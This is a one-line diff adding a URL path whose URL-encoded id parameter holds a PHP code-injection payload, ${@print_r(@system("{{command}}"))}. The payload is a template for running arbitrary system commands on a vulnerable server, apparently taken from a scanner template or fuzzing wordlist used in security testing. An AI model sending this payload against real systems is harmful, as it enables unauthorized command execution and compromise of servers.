@@ -1,0 +1,1 @@
+/images/index.html?id=%24%7B%40print_r%28%40system%28%22{{command}}%22%29%29%7D
